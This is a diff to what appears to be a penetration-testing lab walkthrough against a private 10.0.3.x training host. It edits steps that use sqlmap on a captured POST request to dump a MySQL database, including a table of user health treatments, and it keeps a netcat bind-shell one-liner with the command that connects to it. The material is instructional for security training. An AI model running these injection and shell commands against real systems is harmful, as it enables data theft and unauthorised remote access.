@@ -89,12 +89,12 @@ Argument #1 : '''
 ## 5) Retrieve arbitrary data from the database through SQL injection
 
 > **Duration:** 10 minutes
-- Copy a valid request including HTTP headers and the post data to a text file named `sqli.txt`
-  - Click somewhere in the webpage > Press F12 > A panel opens below > Click Network tab > Click HTML sub tab > Click into the text field in the HTML page > Type a string > Press Enter > Go back to the panel below > Select the request > Copy the Request headers > Paste into the text editor > Go back to the panel below > Click request tab > Copy post data > Paste into the text editor > Save it
-- Note that you cannot use the request below, it is just a sample
+<!-- - Copy a valid request including HTTP headers and the post data to a text file named `sqli.txt`
+  - Click somewhere in the webpage > Press F12 > A panel opens below > Click Network tab > Click HTML sub tab > Click into the text field in the HTML page > Type a string > Press Enter > Go back to the panel below > Select the request > Copy the Request headers > Paste into the text editor > Go back to the panel below > Click request tab > Copy post data > Paste into the text editor > Save it -->
+- Copy the request below and paste it into a text file called `sqli.txt`
 ```sh
 POST /php/recherche_old.php HTTP/1.1
-Host: 10.0.3.189
+Host: 10.0.3.193
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
@@ -103,14 +103,13 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 38
 Origin: http://10.0.3.193
 Connection: close
-Referer: http://10.0.3.189/php/recherche_old.php
+Referer: http://10.0.3.193/php/recherche_old.php
 Cookie: PHPSESSID=a62f5c5fio2i8l8spkas8mfjt6
 Upgrade-Insecure-Requests: 1
 
 recherche=emre&btnRechercher=Rechercher
-
 ```
-- Note that `recherche` should have a valid parameter
+- Copy the PHPSESSID from your browser and replace the value found in the `sqli.txt`
 ### 5.1 Execute `sqlmap` to identify database names
 ```sh
 sqlmap -r sqli.txt --dbms=mysql --dbs 
@@ -124,28 +123,16 @@ available databases [5]:
 [*] performance_schema
 [*] sys
 ```
-### 5.2 Execute `sqlmap` to identify the table names in the `cuiteur` database
-```sh
-sqlmap -r sqli.txt --dbms=mysql -D cuiteur --tables
-```
-- Examine the output
-```sh
-Database: cuiteur
-[7 tables]
-+------------+
-| blablas    |
-| estabonne  |
-| flags      |
-| mentions   |
-| tags       |
-| userhealth |
-| users      |
-+------------+
-```
-### 5.3 Execute `sqlmap` to identify sensitive data in the `userhealth` table
-```sh
+### 5.2 Execute `sqlmap` to get the records found in the in the `cuiteur` database
+<!--
+sqlmap -r sqli.txt --dbms=mysql -D cuiteur --tables 
 sqlmap -r sqli.txt --dbms=mysql -D cuiteur -T userhealth --dump
+-->
+
+```sh
+sqlmap -r sqli.txt --dbms=mysql -D cuiteur --dump
 ```
+
 - Examine the output
 ```sh
 Database: cuiteur
@@ -162,7 +149,6 @@ Table: userhealth
 | 164 | 27        | Stem cell therapy           |
 +-----+-----------+-----------------------------+
 ```
-- Execute `sqlmap` to read the contents of other tables to identify more sensitive data
 
 ## 6) Grant the initial shell access
 
@@ -199,9 +185,9 @@ rm /tmp/pipe; mkfifo /tmp/pipe; /bin/sh /tmp/pipe | nc -l 5555 > /tmp/pipe
 # do you want to retrieve the command standard output? [Y/n/a] n
 ```
 
-### 6.4 Switch to another terminal on your **Kali** and type the following command to establish a `nc` bind connection
-```
-nc 10.0.3.189 5555
+### 6.4 Execute the following command to establish a `nc` bind connection (Switch to another terminal on your **Kali**)
+```sh
+nc 10.0.3.193 5555
 ```
 
 ### 6.5 Execute some OS commands through the `nc` connection
